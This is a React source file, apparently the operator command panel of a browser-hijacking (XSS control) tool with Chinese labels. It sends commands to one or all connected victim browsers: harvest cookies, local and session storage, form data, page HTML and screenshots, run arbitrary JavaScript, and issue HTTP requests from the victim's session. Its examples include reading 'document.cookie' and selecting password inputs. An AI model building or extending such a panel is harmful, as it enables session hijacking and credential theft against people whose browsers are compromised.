import React, { useState } from 'react';
import { Card, Button, Select, Input } from './ui';
import { useApi } from '../hooks/useApi';
import { COMMAND_TYPES } from '../types';
import './CommandPanel.css';

const CommandPanel = ({ selectedClient, onCommandResult, projectId }) => {
  const [selectedCommand, setSelectedCommand] = useState('');
  const [customCode, setCustomCode] = useState('');
  const [domSelector, setDomSelector] = useState('');
  const [xhrConfig, setXhrConfig] = useState({
    method: 'GET',
    url: '',
    headers: '{}',
    data: ''
  });
  const { sendCommandToAll, sendCommandToTarget, loading } = useApi();

  const commandOptions = [
    { value: COMMAND_TYPES.COOKIE, label: '获取 Cookie' },
    { value: COMMAND_TYPES.LOCATION, label: '获取位置信息' },
    { value: COMMAND_TYPES.LOCAL_STORAGE, label: '获取本地存储' },
    { value: COMMAND_TYPES.SESSION_STORAGE, label: '获取会话存储' },
    { value: COMMAND_TYPES.FORMS, label: '获取表单信息' },
    { value: COMMAND_TYPES.USER_AGENT, label: '获取用户代理' },
    { value: COMMAND_TYPES.DOM, label: '获取 DOM 元素' },
    { value: COMMAND_TYPES.EVAL, label: '执行 JavaScript' },
    { value: COMMAND_TYPES.XHR, label: 'HTTP 请求' },
    { value: COMMAND_TYPES.SCREENSHOT, label: '页面截图' },
    { value: COMMAND_TYPES.HTML, label: '获取页面 HTML' }
  ];

  const getCommandArgs = () => {
    const args = {};
    
    if (selectedCommand === COMMAND_TYPES.EVAL && customCode.trim()) {
      args.code = customCode.trim();
    }
    
    if (selectedCommand === COMMAND_TYPES.DOM && domSelector.trim()) {
      args.selector = domSelector.trim();
    }
    
    if (selectedCommand === COMMAND_TYPES.XHR) {
      args.method = xhrConfig.method;
      args.url = xhrConfig.url;
      args.async = true;
      
      try {
        args.headers = JSON.parse(xhrConfig.headers);
      } catch (e) {
        args.headers = {};
      }
      
      if (xhrConfig.data.trim()) {
        args.data = xhrConfig.data.trim();
      }
    }
    
    return args;
  };

  const handleExecuteCommand = async () => {
    if (!selectedCommand) {
      alert('请选择要执行的命令');
      return;
    }

    try {
      const args = getCommandArgs();
      let result;

      if (selectedClient) {
        result = await sendCommandToTarget(selectedClient.id, selectedCommand, args, projectId);
      } else {
        result = await sendCommandToAll(selectedCommand, args, projectId);
      }

      if (result.status === 'success' && onCommandResult) {
        if (result.data.results && Array.isArray(result.data.results)) {
          result.data.results.forEach(commandResult => {
            onCommandResult(commandResult);
          });
        }
      }
    } catch (error) {
      console.error('命令执行失败:', error);
      alert('命令执行失败: ' + error.message);
    }
  };

  const isExecuteDisabled = !selectedCommand || loading;

  return (
    <Card title="命令面板" className="command-panel">
      <div className="command-panel__form">
        <div className="command-panel__target">
          <div className="command-panel__target-label">执行目标:</div>
          <div className="command-panel__target-value">
            {selectedClient ? (
              <span className="command-panel__target-client">
                {selectedClient.id.slice(0, 8)}... (单个客户端)
              </span>
            ) : (
              <span className="command-panel__target-all">
                所有连接的客户端
              </span>
            )}
          </div>
        </div>

        <Select
          label="选择命令"
          value={selectedCommand}
          onChange={(e) => setSelectedCommand(e.target.value)}
          options={commandOptions}
          placeholder="请选择要执行的命令"
          required
        />

        {selectedCommand === COMMAND_TYPES.EVAL && (
          <div className="command-panel__code-input">
            <label className="command-panel__label">JavaScript 代码</label>
            <textarea
              className="command-panel__textarea"
              value={customCode}
              onChange={(e) => setCustomCode(e.target.value)}
              placeholder="输入要执行的 JavaScript 代码..."
              rows={4}
            />
            <div className="command-panel__code-examples">
              <div className="command-panel__examples-title">常用示例:</div>
              <button
                type="button"
                className="command-panel__example-btn"
                onClick={() => setCustomCode('document.title')}
              >
                获取页面标题
              </button>
              <button
                type="button"
                className="command-panel__example-btn"
                onClick={() => setCustomCode('window.location.href')}
              >
                获取当前URL
              </button>
              <button
                type="button"
                className="command-panel__example-btn"
                onClick={() => setCustomCode('document.cookie')}
              >
                获取Cookie
              </button>
            </div>
          </div>
        )}

        {selectedCommand === COMMAND_TYPES.DOM && (
          <Input
            label="CSS 选择器"
            value={domSelector}
            onChange={(e) => setDomSelector(e.target.value)}
            placeholder="例如: input[type=password], .username"
          />
        )}

        {selectedCommand === COMMAND_TYPES.XHR && (
          <div className="command-panel__xhr-config">
            <div className="command-panel__xhr-row">
              <Select
                label="HTTP 方法"
                value={xhrConfig.method}
                onChange={(e) => setXhrConfig(prev => ({...prev, method: e.target.value}))}
                options={[
                  {value: 'GET', label: 'GET'},
                  {value: 'POST', label: 'POST'},
                  {value: 'PUT', label: 'PUT'},
                  {value: 'DELETE', label: 'DELETE'}
                ]}
              />
              <Input
                label="请求URL"
                value={xhrConfig.url}
                onChange={(e) => setXhrConfig(prev => ({...prev, url: e.target.value}))}
                placeholder="https://example.com/api/data"
                required
              />
            </div>
            <Input
              label="请求头 (JSON格式)"
              value={xhrConfig.headers}
              onChange={(e) => setXhrConfig(prev => ({...prev, headers: e.target.value}))}
              placeholder='{"Content-Type": "application/json"}'
            />
            <div className="command-panel__code-input">
              <label className="command-panel__label">请求数据</label>
              <textarea
                className="command-panel__textarea"
                value={xhrConfig.data}
                onChange={(e) => setXhrConfig(prev => ({...prev, data: e.target.value}))}
                placeholder="POST/PUT请求的数据内容..."
                rows={3}
              />
            </div>
          </div>
        )}

        <div className="command-panel__actions">
          <Button
            variant="primary"
            onClick={handleExecuteCommand}
            disabled={isExecuteDisabled}
            loading={loading}
          >
            执行命令
          </Button>
          
          <Button
            variant="secondary"
            onClick={() => {
              setSelectedCommand('');
              setCustomCode('');
              setDomSelector('');
              setXhrConfig({
                method: 'GET',
                url: '',
                headers: '{}',
                data: ''
              });
            }}
            disabled={loading}
          >
            清空
          </Button>
        </div>
      </div>
    </Card>
  );
};

export default CommandPanel;